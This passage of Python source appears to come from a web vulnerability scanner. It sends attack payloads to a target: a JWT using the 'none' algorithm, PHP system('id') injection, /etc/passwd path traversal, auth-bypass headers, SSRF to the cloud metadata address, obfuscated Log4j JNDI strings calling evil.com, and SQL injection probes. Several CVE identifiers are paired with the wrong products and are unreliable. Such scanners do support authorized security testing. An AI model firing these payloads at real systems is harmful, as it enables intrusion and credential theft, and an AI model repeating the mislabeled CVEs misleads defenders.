            'severity': 'Medium',
            'description': 'GraphQL Introspection Enabled'
        },

        # JWT Vulnerabilities
        'JWT-NONE-ALG': {
            'paths': ['/api/auth', '/auth'],
            'methods': ['GET'],
            'headers': {
                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.'
            },
            'test': lambda r: r.status_code != 401,
            'severity': 'Critical',
            'description': 'JWT None Algorithm Vulnerability'
        },

        'DJANGO-DEBUG-MODE': {
            'paths': ['/random_invalid_path'],
            'methods': ['GET'],
            'test': lambda r: 'DEBUG = True' in r.text or 'Django Debug' in r.text,
            'severity': 'High',
            'description': 'Django Debug Mode Enabled'
        },

        'LARAVEL-DEBUG': {
            'paths': ['/random_invalid_path'],
            'methods': ['GET'],
            'test': lambda r: 'laravel' in r.text.lower() and 'stack trace' in r.text.lower(),
            'severity': 'High',
            'description': 'Laravel Debug Mode Enabled'
        },

        'RAILS-INFO-LEAK': {
            'paths': ['/rails/info/properties', '/rails/info/routes'],
            'methods': ['GET'],
            'test': lambda r: 'Ruby version' in r.text or 'Rails version' in r.text,
            'severity': 'Medium',
            'description': 'Rails Information Disclosure'
        },

        'NODE-ENV-DISCLOSURE': {
            'paths': ['/'],
            'methods': ['GET'],
            'test': lambda r: 'NODE_ENV' in r.text or 'node_modules' in r.text,
            'severity': 'Medium',
            'description': 'Node.js Environment Disclosure'
        },

        # Core PHP RCE Test
        'CVE-2018-19518': {  # PHP RCE
            'methods': ['POST', 'GET'],
            'headers': {'Accept': 'application/x-php'},
            'payloads': [
                '<?php system("id"); ?>',
                '<?= system("id") ?>',
                '<?php phpinfo(); ?>'
            ],
            'test': lambda r: any(
                indicator in r.text.lower() 
                for indicator in [
                    'uid=', 'php version', 'system'
                ]
            ),
            'severity': 'Critical',
            'description': 'PHP Remote Code Execution',
            'validation': lambda r: len(r.content) > 0  # Additional validation
        },

        # Nginx Path Traversal
        'nginx-misconfig': {
            'paths': [
                '/..%2f..%2f..%2f..%2f../etc/passwd',
                '/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                '/....//....//....//....//etc/passwd',
                '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
            ],
            'methods': ['GET'],
            'test': lambda r: 'root:x:' in r.text or r.status_code == 200,
            'version_pattern': r'nginx/(\d+\.\d+\.\d+)',
            'severity': 'High',
            'description': 'Nginx Path Traversal',
            'validation': lambda r: 'nginx' in r.headers.get('Server', '').lower()
        },

        # Enhanced Auth Bypass
        'auth-bypass': {
            'paths': ['/admin', '/dashboard', '/private', '/wp-admin', '/administrator'],
            'methods': ['GET'],
            'headers': {
                'X-Original-URL': '/admin',
                'X-Rewrite-URL': '/admin',
                'X-Forwarded-Host': 'evil.com',
                'X-Forwarded-For': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1'
            },
            'test': lambda r: r.status_code in [200, 301, 302],
            'severity': 'High',
            'description': 'Authentication Bypass',
            'validation': lambda r: not any(error in r.text.lower() for error in ['forbidden', 'not found', 'error'])
        },

        # Enhanced SSRF Detection
        'SSRF': {
            'params': {
                'url': [
                    'http://169.254.169.254/latest/meta-data/',
                    'http://127.0.0.1:80',
                    'http://localhost:80',
                    'file:///etc/passwd',
                    'dict://localhost:11211/',
                ],
                'proxy': 'internal-server',
                'path': 'file:///etc/passwd',
                'dest': 'http://localhost',
                'callback': 'http://localhost',
                'data': 'http://localhost',
                'host': 'localhost',
                'port': '11211'
            },
            'methods': ['GET', 'POST'],
            'headers': {
                'X-Forwarded-For': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1'
            },
            'test': lambda r: any(
                indicator in r.text.lower() 
                for indicator in [
                    'ami-id', 'root:', 'internal', 'localhost', 
                    '127.0.0.1', 'mysql', 'redis', 'memcache'
                ]
            ),
            'severity': 'High',
            'description': 'Server-Side Request Forgery',
            'validation': lambda r: r.status_code != 404
        },

        # Log4j Additional Tests
        'CVE-2021-44228': {  # Log4j
            'payloads': [
                '${jndi:ldap://evil.com/a}',
                '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a}',
                '${${::-j}ndi:rmi://evil.com/a}',
                '${jndi:dns://evil.com}',
                '${${lower:jndi}:${lower:rmi}://evil.com/a}',
                '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}'
            ],
            'methods': ['GET', 'POST', 'PUT'],
            'headers': {
                'X-Api-Version': '${jndi:ldap://evil.com/a}',
                'User-Agent': '${jndi:ldap://evil.com/a}',
                'Referer': '${jndi:ldap://evil.com/a}',
                'X-Forwarded-For': '${jndi:ldap://evil.com/a}',
                'Authentication': '${jndi:ldap://evil.com/a}'
            },
            'test': lambda r: any(
                pattern in str(r.headers) or pattern in r.text 
                for pattern in [
                    'jndi:', 'javax.naming', 'Reference Class',
                    'Error looking up JNDI resource'
                ]
            ),
            'severity': 'Critical',
            'description': 'Log4j Remote Code Execution',
            'validation': lambda r: r.status_code in [200, 404, 500]
        },

        # 2024 CVEs
        'CVE-2024-21626': {
            'paths': ['/actuator/gateway/routes', '/gateway/routes'],
            'methods': ['GET', 'POST'],
            'version_pattern': r'Spring-Boot/(\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('3.2.2'),
            'test': lambda r: 'routeDefinition' in r.text or 'predicate' in r.text,
            'severity': 'Critical',
            'description': 'Spring Cloud Gateway RCE'
        },

        'CVE-2024-21716': {
            'paths': ['/'],
            'methods': ['GET'],
            'headers': {
                'Content-Type': 'text/html',
                'X-Requested-With': '<img src=x onerror=alert(1)>'
            },
            'test': lambda r: 'X-Requested-With' in str(r.headers),
            'severity': 'High',
            'description': 'Microsoft Outlook XSS'
        },

        'CVE-2024-0759': {
            'paths': ['/api/v1/namespaces/default/pods'],
            'methods': ['GET'],
            'headers': {'Authorization': 'Bearer invalid_token'},
            'test': lambda r: r.status_code == 401 and 'k8s' in str(r.headers),
            'severity': 'Critical',
            'description': 'Kubernetes Privilege Escalation'
        },

        'CVE-2024-21733': {
            'paths': ['/wp-admin/admin-ajax.php'],
            'methods': ['POST'],
            'params': {'action': 'upload-attachment'},
            'version_pattern': r'WordPress/(\d+\.\d+\.\d+)',
            'affected_versions': lambda v: version.parse(v) < version.parse('6.4.3'),
            'test': lambda r: 'wp-admin' in r.text,
            'severity': 'High',
            'description': 'WordPress File Upload Vulnerability'
        },

        'CVE-2024-0185': {
            'paths': ['/api/system/config'],
            'methods': ['GET'],
            'test': lambda r: 'grafana' in str(r.headers).lower(),
            'severity': 'Critical',
            'description': 'Grafana Authentication Bypass'
        },

        'CVE-2024-21893': {
            'paths': ['/v2/_catalog', '/v2/'],
            'methods': ['GET'],
            'test': lambda r: 'Docker-Distribution-Api-Version' in r.headers,
            'severity': 'High',
            'description': 'Docker Registry Access Control Bypass'
        },

        'CVE-2024-0019': {
            'paths': ['/api/v1/query'],
            'methods': ['POST'],
            'params': {'query': 'sum(rate(http_requests_total[1m])) by (job)'},
            'test': lambda r: 'prometheus' in str(r.headers).lower(),
            'severity': 'High',
            'description': 'Prometheus CSRF Vulnerability'
        },

        'CVE-2024-21899': {
            'paths': ['/solr/admin/cores'],
            'methods': ['GET'],
            'test': lambda r: 'Apache Solr' in r.text,
            'severity': 'Critical',
            'description': 'Apache Solr RCE'
        },

        'CVE-2024-0227': {
            'paths': ['/.git/config', '/.git/HEAD'],
            'methods': ['GET'],
            'test': lambda r: '[core]' in r.text or 'ref:' in r.text,
            'severity': 'Medium',
            'description': 'Git Repository Information Disclosure'
        },

        'CVE-2024-21887': {
            'paths': ['/api/v1/users', '/api/users'],
            'methods': ['GET'],
            'headers': {'X-API-Version': '1.0'},
            'test': lambda r: r.status_code == 200 and 'users' in r.text.lower(),
            'severity': 'High',
            'description': 'API Authentication Bypass'
        },

        'FORTINET-2024': {
            'paths': ['/remote/fgt_lang'],
            'methods': ['GET'],
            'test': lambda r: 'FortiGate' in str(r.headers),
            'severity': 'Critical',
            'description': 'FortiGate SSL VPN Vulnerability'
        },

        'CITRIX-2024': {
            'paths': ['/vpn/index.html', '/vpn/'],
            'methods': ['GET'],
            'test': lambda r: 'Citrix' in str(r.headers),
            'severity': 'Critical',
            'description': 'Citrix Gateway Vulnerability'
        },

        'VMWARE-2024': {
            'paths': ['/horizon/'],
            'methods': ['GET'],
            'test': lambda r: 'VMware' in str(r.headers),
            'severity': 'High',
            'description': 'VMware Horizon Vulnerability'
        }
    }

    results = []
    session = requests.Session()
    
    # Configure session
    if auth:
        if isinstance(auth, tuple):
            session.auth = auth
        else:
            session.headers['Authorization'] = f'Bearer {auth}'
    
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    try:
        # Get baseline response with extended timeout
        baseline_response = session.get(url, timeout=15)
        server_info = baseline_response.headers.get('Server', 'Unknown')
        print(f"{COLOR_BLUE}[*] Server detected: {server_info}{COLOR_RESET}")
        
        # Enhanced version detection
        versions = detect_versions(baseline_response)
        if versions:
            print("\nDetected versions:")
            for framework, ver in versions.items():
                print(f"{COLOR_BLUE}[*] {framework}: {ver}{COLOR_RESET}")

        # Test vulnerabilities with improved accuracy
        for vuln_id, test_info in vulnerability_tests.items():
            try:
                severity_color = {
                    'Critical': COLOR_RED,
                    'High': COLOR_ORANGE,
                    'Medium': COLOR_YELLOW,
                    'Low': COLOR_GREY
                }.get(test_info['severity'], COLOR_BLUE)
                
                print(f"\n{COLOR_BLUE}[*] Testing {vuln_id} - {test_info['description']}{COLOR_RESET}")
                
                # Version-specific validation
                if 'version_pattern' in test_info and 'affected_versions' in test_info:
                    version_match = detect_specific_version(baseline_response, test_info['version_pattern'])
                    if version_match and test_info['affected_versions'](version_match):
                        version_info = (
                            f"{severity_color}[!] Vulnerable version detected\n"
                            f"    Version: {version_match}\n"
                            f"    Vulnerability: {vuln_id}{COLOR_RESET}"
                        )
                        print(version_info)
                        results.append(version_info)

                # Enhanced testing with validation
                for method in test_info.get('methods', ['GET']):
                    for path in test_info.get('paths', ['']):
                        test_url = urljoin(url, path.lstrip('/'))
                        
                        for payload in test_info.get('payloads', [None]):
                            try:
                                headers = test_info.get('headers', {}).copy()
                                params = test_info.get('params', {}).copy()
                                
                                if payload:
                                    params['payload'] = payload
                                    headers['X-Payload'] = payload
                                
                                response = session.request(
                                    method=method,
                                    url=test_url,
                                    headers=headers,
                                    params=params if method == 'GET' else None,
                                    data=params if method != 'GET' else None,
                                    timeout=10,
                                    allow_redirects=False
                                )
                                
                                # Enhanced validation with multiple checks
                                if (test_info['test'](response) and
                                    ('validation' not in test_info or test_info['validation'](response))):
                                    
                                    vuln_info = (
                                        f"{severity_color}[+] Potentially vulnerable to {vuln_id}\n"
                                        f"    Severity: {test_info['severity']}\n"
                                        f"    Description: {test_info['description']}\n"
                                        f"    Method: {method}\n"
                                        f"    URL: {test_url}\n"
                                        f"    Payload: {payload if payload else 'N/A'}\n"
                                        f"    Evidence: Response indicates vulnerability pattern{COLOR_RESET}"
                                    )
                                    print(vuln_info)
                                    # Store without color codes for file output
                                    results.append(vuln_info.replace(COLOR_RED, '')
                                                          .replace(COLOR_GREEN, '')
                                                          .replace(COLOR_BLUE, '')
                                                          .replace(COLOR_YELLOW, '')
                                                          .replace(COLOR_ORANGE, '')
                                                          .replace(COLOR_GREY, '')
                                                          .replace(COLOR_RESET, ''))
                                    
                            except requests.RequestException as e:
                                print(f"{COLOR_GREY}[-] Error testing {test_url}: {str(e)}{COLOR_RESET}")
                                continue
                
            except Exception as e:
                print(f"{COLOR_ORANGE}[-] Error testing {vuln_id}: {str(e)}{COLOR_RESET}")
                continue
        
        # Save results
        if results and output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write(f"CVE Scan Results for {url}\n")
                    f.write("=" * 50 + "\n\n")
                    f.write("\n\n".join(results))
                print(f"\n{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")
            except Exception as e:
                print(f"\n{COLOR_RED}[-] Error saving results: {str(e)}{COLOR_RESET}")
        elif not results:
            print(f"\n{COLOR_GREEN}[+] No vulnerabilities detected{COLOR_RESET}")
            
    except requests.RequestException as e:
        print(f"{COLOR_RED}[-] Error scanning {url}: {str(e)}{COLOR_RESET}")
    except Exception as e:
        print(f"{COLOR_RED}[-] Unexpected error: {str(e)}{COLOR_RESET}")

def detect_versions(response):
    """Enhanced version detection for multiple frameworks"""
    versions = {}
    headers = str(response.headers)
    body = response.text.lower()
    
    patterns = {
        'Django': (r'Django/(\d+\.\d+\.\d+)', headers),
        'Laravel': (r'Laravel\s?v?(\d+\.\d+\.\d+)', body),
        'Rails': (r'Rails\s?(\d+\.\d+\.\d+)', headers + body),
        'Express': (r'express/(\d+\.\d+\.\d+)', headers),
        'Spring': (r'Spring-Boot/(\d+\.\d+\.\d+)', headers),
        'WordPress': (r'WordPress/(\d+\.\d+\.\d+)', headers + body),
        'PHP': (r'PHP/(\d+\.\d+\.\d+)', headers),
        'nginx': (r'nginx/(\d+\.\d+\.\d+)', headers),
        'Apache': (r'Apache/(\d+\.\d+\.\d+)', headers)
    }
    
    for framework, (pattern, content) in patterns.items():
        match = re.search(pattern, content)
        if match:
            versions[framework] = match.group(1)
    
    return versions

def detect_specific_version(response, pattern):
    """Detect specific version using provided pattern"""
    match = re.search(pattern, str(response.headers) + response.text)
    return match.group(1) if match else None

def perform_security_checks(response, results):
    """Perform additional security checks on the response"""
    # Security headers check
    security_headers = {
        'X-Frame-Options': 'CWE-1021',
        'X-Content-Type-Options': 'CWE-693',
        'Strict-Transport-Security': 'CWE-319',
        'Content-Security-Policy': 'CWE-1021',
        'X-XSS-Protection': 'CWE-79',
        'Referrer-Policy': 'CWE-200'
    }
    
    for header, cwe in security_headers.items():
        if header not in response.headers:
            header_info = (
                f"{COLOR_YELLOW}[!] Missing security header: {header}\n"
                f"    Associated with {cwe}\n"
                f"    Impact: Potential security weakness\n"
                f"    Recommendation: Implement {header} header{COLOR_RESET}"
            )
            results.append(header_info)
    
    # Cookie security check
    cookies = response.headers.get('Set-Cookie', '')
    if cookies and (
        'secure' not in cookies.lower() or 
        'httponly' not in cookies.lower()
    ):
        cookie_info = (
            f"{COLOR_YELLOW}[!] Insecure cookie configuration\n"
            f"    Missing secure/httponly flags\n"
            f"    Impact: Cookies may be vulnerable to theft\n"
            f"    Recommendation: Set secure and httponly flags{COLOR_RESET}"
        )
        results.append(cookie_info)

def directory_fuzz(target, output_file=None, payload_file=None):
    print(f"[*] Starting directory fuzzing on {target}")

    if payload_file:
        try:
            with open(payload_file, 'r') as f:
                # Skip lines starting with "#" and empty lines
                directories = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"{COLOR_PURPLE}[*] Loaded {len(directories)} directories from payload file '{payload_file}'{COLOR_RESET}")
        except FileNotFoundError:
            print(f"{COLOR_RED}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")
            return
    else:
        directories = [
            "download58", "image3.xml", "download85.css", "test54.jpg", "test49.css", "service75", "user86", "test43", "backup68.js", "example33", "config35.json", "config91.html", "login79", "backup77.js", "service41.xml", "login1.php", "config32", "download62", "image15.css", "test16", "login70.html", "test53.png", "config74.js", "config60", "test91.html", "user31", "admin90.xml", "test36.jpg", "login56", "login59.json", "config64.html", "login95.json", "download65.css", "example2", "backup77.xml", "user92.html", "user22.xml", "login26", "admin30", "test44", "config56.png", "backup69.xml", "login98", "test6", "backup38.json", "image14", "admin29", "login66.xml", "user100", "login39", "service30.xml", "test11", "user58", "backup13", "image19", "example4", "test74.json", "service3", "backup51", "example46", "download49", "config35.png", "login81", "admin10.json", "image96", "backup70.php", "login24.css", "test49.js", "image56", "service43.js", "user94.xml", "example57", "login76.json", "service100.json", "image54.png", "login67.zip", "example75", "service42.js", "login58", "download99", "login53.jpg", "service92.js", "example55", "test76", "service18", "backup78", "example44", "admin87", "login2", "test32", "admin67", "example4", "test66", "download11", "config34", "example4.zip", "config97", "config14.json", "example91", "admin100.zip", "config95.php", "image15", "download13", "example25", "test65", "user63.json", "config39.html", "config97.json", "test83.jpg", "login88", "user10.js", "example50", "image6", "test89.css", "config90", "admin44.json", "login100", "backup55.zip", "backup63", "download74.jpg", "example99.png", "admin32", "service82", "service81.html", "admin40.html", "example93.php", "download54", "config9", "config39", "login8", "admin79", "user64", "download34.css", "login26", "example9", "service87", "service73", "admin3", "example49.js", "config18.php", "admin19", "test99.css", "backup54.jpg", "login66.html", "service99.html", "user98.jpg", "config53.php", "image26", "service90.json", "image42.html", "example19", "service86.zip", "config44.php", "test56", "user91", "login95", "test63.xml", "test83", "service4.php", "download15.json", "login19", "test30", "service73.html", "config16.js", "download54", "test90", "login72", "test51", "backup35", "download57", "service72", "image10", "image31", "service47", "backup64.js", "backup9", "service92", "config69.html", "service34.css", "backup95.html", "test4", "admin16.html", "image18.xml", "login11", "user24", "service64.css", "test46.zip", "backup31", "test20.php", "login24", "service38", "service60", "admin20.php", "example12", "download59", "backup67", "image79", "config55.html", "config64", "backup68.html", "admin32", "user39.js", "backup70", "example93.jpg", "login96.html", "download58", "config76", "service16", "test28", "image92", "admin20.zip", "admin92.php", "login35.js", "example38.jpg", "download71", "user39.zip", "config88.png", "config38", "config95.jpg", "service66.xml", "backup77", "admin70.png", "test84.jpg", "example100.zip", "image96", "example40", "admin25.png", "service42", "admin82", "image42", "example18", "backup99", "test52", "login66.html", "config7", "user82.jpg", "backup60", "config50", "download71", "user51", "example93.php", "admin12.css", "download42", "config92", "test48", "image59.html", "service4", "example12", "user8", "download28", "user31.php", "example20.js", "config76", "backup33", "service71", "service24.js", "user43.php", "user96.html", "download72", "example71.xml", "backup54", "login15", "example99", "test43", "config63", "config47.html", "user90.xml", "image55", "login2", "service51", "login18.jpg", "image60", "config29", "backup55.jpg", "config48", "image75", "backup9.js", "backup77", "download87.jpg", "user8.png", "config72", "test21.png", "example35.zip", "download69", "config10", "config4", "test45", "login84", "admin13", "example84.html", "service26", "test31", "user7", "config34", "image85.php", "download61", "example25", "config9", "service91.zip", "user53", "example51", "image80.css", "download10", "service24", "backup38", "test63.json", "service15", "backup69.php", "config92.css", "user19", "backup52", "download50", "image12", "test98", "user59", "login25", "example77", "service74", "download40", "backup44.png", "config37", "admin90", "admin61", "test92", "image37", "user30", "backup66.zip", "config79.zip", "example6", "example91.zip", "user50", "config39.zip", "download39.jpg", "download82.js", "backup65", "test2", "admin40", "example19", "login98", "user92.zip", "example91", "backup62", "admin82", "image36.zip", "admin40", "image47", "image93", "example88", "config90", "image58", "service93.js", "user93", "example87.css", "image34", "login69", "user100.xml", "config8.css", "backup5", "service50", "download96.png", "image39", "config2.php", "service7.png", "admin69", "service67.jpg", "login76", "login14", "service95.php", "backup84", "download51.html", "user49", "service81.png", "example61", "backup46.xml", "test96.css", "download40", "backup93", "config13", "service91.xml", "user88", "test98.jpg", "download74", "download25.js", "user39", "config7", "service16.jpg", "example36.js", "service40", "example69", "user1.xml", "download72", "service58", "user19.png", "test46", "admin64", "image45", "example35", "image56", "service14.zip", "backup72.css", "service94", "backup64.js", "image40", "login29.php", "image44.xml", "download79.css", "image10", "login99", "backup18", "example61.xml", "admin42", "login46.php", "login10.css", "download58.png", "image33.css", "download54", "image3.jpg", "config63.json", "download33.zip", "config79", "login44.jpg", "backup12", "service34.html", "test98", "user94.js", "example73.php", "download64.zip", "login78.html", "backup46", "image53.js", "user83", "user100.html", "example6", "login83", "admin5.css", "example36.php", "admin35", "backup75.php", "login17", "login69", "user12", "backup13.jpg", "user77.json", "login91", "example98.xml", "test1.json", "image41", "admin49.zip", "login95.png", "login83", "login10", "service45", "example44", "admin2.png", "test88", "admin7.js", "login21.php", "login77.html", "image67.html", "admin12.json", "service33.jpg", "login84", "image30.json", "test24.css", "user26.xml", "service97.png", "example69", "login28", "image2.png", "backup57", "example67.php", "login67", "admin65.png", "example92.jpg", "example84.js", "user43", "download11.html", "download39", "test77.js", "backup23.zip", "user24.css", "test20.html", "service19", "config57.jpg", "config88", "download71.zip", "config81.zip", "service65", "test48", "test19.css", "login71", "config66.json", "download87", "user19.xml", "login16.json", "example54.js", "image46", "config75.json", "admin44", "login78", "test95", "user54.json", "config76", "login18", "test66.json", "download40", "test9.js", "service41", "service10.xml", "login42", "config84.zip", "download92", "login36.css", "image64", "test72.xml", "test86", "config17.zip", "backup78", "login77", "user66.php", "image1", "config5.json", "admin69.png", "backup15.json", "backup49.zip", "service99.js", "service33", "config79", "user66", "backup97", "image41", "admin91", "config48", "service71.json", "test95.css", "backup24", "login34.css", "service59.png", "download49.html", "backup75", "backup33.php", "login24", "login22", "service51.png", "admin99.jpg", "example39.json", "config5", "admin96", "image16", "example92", "download14.json", "user16", "service78", "config77", "config17.xml", "user44.js", "user5", "config49.php", "backup36.json", "service61", "service3", "example73", "download4", "login79.js", "backup92.png", "service23.html", "admin24.js", "download91", "backup62", "admin67", "image65", "download34", "user46", "download2", "service24", "example64", "download94", "download66.png", "config37.jpg", "user61", "login54.png", "service31", "test4.css", "config22", "example51.png", "user66", "user59", "user34.zip", "login77", "login2.xml", "download9", "test16.xml", "service59", "example33", "service75", "login82", "backup62", "download73.zip", "example72.js", "backup59.png", "user8.php", "config87.xml", "config43.zip", "user33", "config21", "admin65.php", "admin96.js", "login80", "example6.php", "image45", "download80", "test1.json", "test99", "config32", "download66.php", "download71", "config12.zip", "example3.png", "test69.zip", "config29.jpg", "admin53", "login64", "config88.html", "user76.jpg", "image48", "login27.png", "image58", "test57", "example47.png", "admin67", "login16", "download91.zip", "backup4.json", "backup62", "image6", "image11.php", "download75", "config95.xml", "image65", "config70", "config11.js", "user24", "download4.php", "admin63", "user67", "admin84", "example54", "example11", "service82.html", "login29.json", "example60.php", "service99", "user70", "config25.json", "image95", "test61.jpg", "backup92.js", "user22", "backup55", "user28", "image44.php", "download70", "example94.json", "service23", "login9.xml", "admin29.json", "service63", "example57", "admin66", "login35.zip", "example23.png", "backup90", "download54.json", "config66", "backup61", "example75.json", "admin68", "service47", "user5.json", "login31.png", "service36", "login43.php", "example72.json", "image86.png", "config4.php", "user87.php", "config3", "test93", "example88", "download25", "image69", "image100", "login82", "admin75.png", "config94", "login63.css", "user77", "config87.js", "login50.css", "config29.png", "config25", "config46", "admin67.php", "user62.html", "backup79", "service72", "backup59", "admin59.js", "example74", "admin70", "download29", "config29", "test7.json", "login62.css", "service80.png", "example49", "service30", "admin80.php", "example60", "example38.css", "backup62.jpg", "backup2", "test34.xml", "login37", "test74.png", "image46.js", "example44.js", "admin8", "image8", "image83.png", "config6", "config91.jpg", "download36", "service3", "image49", "download45.js", "config5", "config88", "test19.zip", "login3", "backup20", "example86", "service74", "service35", "config11", "test63", "image58.jpg", "admin100.xml", "service94", "login29.json", "config43.xml", "example41", "service62.jpg", "user80", "backup10.xml", "user2", "backup46", "backup100.jpg", "config24.zip", "download15.png", "admin28", "image63", "admin68", "test46", "backup67", "user23", "backup28", "admin97", "user95", "image27.css", "user40.php", "user22", "login87", "service52", "service38.json", "example84", "login35", "backup60.jpg", "backup99", "user97.jpg", "backup66.css", "user85.js", "user86.html", "test48", "config89.zip", "test91", "config100", "test58.json", "image18", "user56.xml", "download66.css", "backup7.png", "image60", "image91", "config30.json", "download35", "user62", "backup59", "image52", "backup88.jpg", "example53", "download60", "admin58.html", "test59.html", "config49", "download68.xml", "user4.xml", "config98.xml", "backup75.xml", "image24.html", "login98", "config92", "image64.png", "example97.js", "service8.zip", "config15", "backup85.js", "service79", "login78.xml", "config65.css", "download70", "image6", "service29.png", "example99.json", "example94", "user12", "user43.xml", "backup32", "example13", "image58", "user80.css", "example8", "user31.zip", "backup64.php", "user73", "download79", "download15", "image81", "config80", "test15.zip", "user15.php", "download34", "admin14.json", "backup25.html", "backup24.zip", "test87", "config48", "download89", "login47.zip", "image63", "admin100", "download1", "service18", "example83.zip", "config65", "image96", "config32", "image3.html", "admin29", "example3", "admin62", "login9.png", "test94.jpg", "image74.jpg", "test95", "example24.css", "admin73", "backup63", "admin10.json", "image95", "test40", "backup2.xml", "example98", "test91", "backup95", "image18.xml", "config58.jpg", "image46.xml", "image55", "config57", "login11.css", "user23", "service75.js", "image63.xml", "example72.jpg", "example26.zip", "test69", "config17.php", "user17", "test78.jpg", "image48", "login51", "backup50", "image10.php", "backup82.php", "admin33", "download41", "service29.css", "service39", "test17.html", "config63.jpg", "config77.zip", "admin19", "test84", "service82", "service40.css", "test66", "image18", "service60.zip", "download69", "backup30", "user99", "user40", "download42.xml", "example5.xml", "service89.html", "backup98.png", "admin66.png", "download65", "image7.jpg", "user24", "download7", "image2", "user71", "config73.html", "service16.jpg", "user15.jpg", "backup22.html", "test74", "service31", "user45.jpg", "test28.json", "admin14.php", "download95.html", "test29.html", "config47.jpg", "image4", "config1.php", "user45.jpg", "config1", "service14", "test19.xml", "download96.html", "example67.jpg", "example86.html", "test78.html", "user82.zip", "login95", "image28.xml", "image22", "config82", "admin38", "example18", "service62", "service59", "download66.html", "login75", "backup2", "image29", "user11", "admin12", "login21.png", "config68", "service26", "download94.php", "config15.json", "user66", "download99", "test81", "example62.jpg", "config78.json", "login30.html", "config17", "user14", "example86", "example19", "backup52", "login10", "config77.html", "service16", "user84", "user15", "image85.css", "download55", "admin83", "example61", "download89.css", "backup12", "admin90.png", "download6", "admin24.js", "backup12", "example39.js", "user91.png", "test27", "login70"
        ]
        print(f"[*] Using default directory list with {len(directories)} entries")

    results = []
    for directory in directories:
        url = f"{target.rstrip('/')}/{directory}"
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)  # Prevent redirects to capture the exact status code
            status_code = response.status_code
            color = color_status_code(status_code)
            result = f"{color}{url} [Status {status_code}]{COLOR_RESET}"
            results.append(result)
            print(result if status_code != 404 else f"{COLOR_GREY}{result}{COLOR_RESET}")
        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Error accessing {url}: {str(e)}{COLOR_RESET}")

    save_results(output_file, results)

def get_session():
    """Create and return a configured requests session"""
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*'
    })
    return session

def safe_request(url, session, timeout=10):
    """Make a safe HTTP request with error handling"""
    try:
        response = session.get(url, timeout=timeout)
        response.raise_for_status()
        return response
    except requests.RequestException as e:
        print(f"{COLOR_RED}[-] Error making request to {url}: {str(e)}{COLOR_RESET}")
        return None

def detect_waf(url):
    """Advanced WAF detection with fingerprinting capabilities"""
    waf_signatures = {
        'Cloudflare': [
            'cf-ray',
            '__cfduid',
            'cf-cache-status'
        ],
        'AWS WAF': [
            'x-amzn-RequestId',
            'x-amz-cf-id',
            'x-amz-id'
        ],
        'Akamai': [
            'akamai-origin-hop',
            'aka-cdn-cache-status'
        ],
        'Imperva': [
            'x-iinfo',
            'x-cdn',
            'incap_ses'
        ],
        'F5 BIG-IP ASM': [
            'x-cnection',
            'x-wa-info'
        ]
    }

    print(f"\n{COLOR_BLUE}[*] Starting WAF detection for {url}{COLOR_RESET}")
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }
        
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        detected_wafs = []

        # Check response headers against WAF signatures
        for waf_name, signatures in waf_signatures.items():
            for signature in signatures:
                if signature.lower() in str(response.headers).lower():
                    detected_wafs.append(waf_name)
                    break

        # Check for common WAF behavior
        if response.status_code == 403:
            # Test with malicious payload
            malicious_url = f"{url}?id=1' OR '1'='1"
            mal_response = requests.get(malicious_url, headers=headers, verify=False, timeout=10)
            
            if mal_response.status_code in [403, 406, 501]:
                detected_wafs.append("Generic WAF (Behavioral Detection)")

        if detected_wafs:
            print(f"{COLOR_GREEN}[+] WAF(s) Detected: {', '.join(set(detected_wafs))}{COLOR_RESET}")
            return list(set(detected_wafs))
        else:
            print(f"{COLOR_ORANGE}[-] No WAF detected{COLOR_RESET}")
            return []

    except Exception as e:
        print(f"{COLOR_RED}[-] Error during WAF detection: {str(e)}{COLOR_RESET}")
        return []

def generate_dynamic_payloads(target_url, scan_type):
    """Generate dynamic payloads based on target analysis"""
    print(f"\n{COLOR_BLUE}[*] Generating dynamic payloads for {target_url}{COLOR_RESET}")
    
    payloads = set()
    try:
        # Get initial response to analyze
        response = requests.get(target_url, verify=False, timeout=10)
        
        # Extract potential parameters
        params = extract_parameters(target_url)
        parsed = urlparse(target_url)
        
        if scan_type == "sqli":
            # Generate SQL injection payloads based on URL structure
            for param in params:
                # Basic numeric parameter detection
                if params[param].isdigit():
                    payloads.add(f"{param}=1 OR 1=1")
                    payloads.add(f"{param}=1 UNION SELECT NULL--")
                    payloads.add(f"{param}=1) UNION SELECT NULL--")
                
                # String parameter detection
                else:
                    payloads.add(f"{param}=' OR '1'='1")
                    payloads.add(f"{param}=') OR ('1'='1")
                    payloads.add(f"{param}=1' UNION SELECT NULL--")
            
            # Add database-specific payloads based on response analysis
            if "mysql" in response.text.lower():
                payloads.add("/*!50000SELECT*/")
                payloads.add("/*!50000UNION*/")
            elif "postgresql" in response.text.lower():
                payloads.add("SELECT/**/CASE/**/WHEN")
                payloads.add("SELECT/**/pg_sleep(5)")
            
        elif scan_type == "xss":
            # Generate XSS payloads based on context
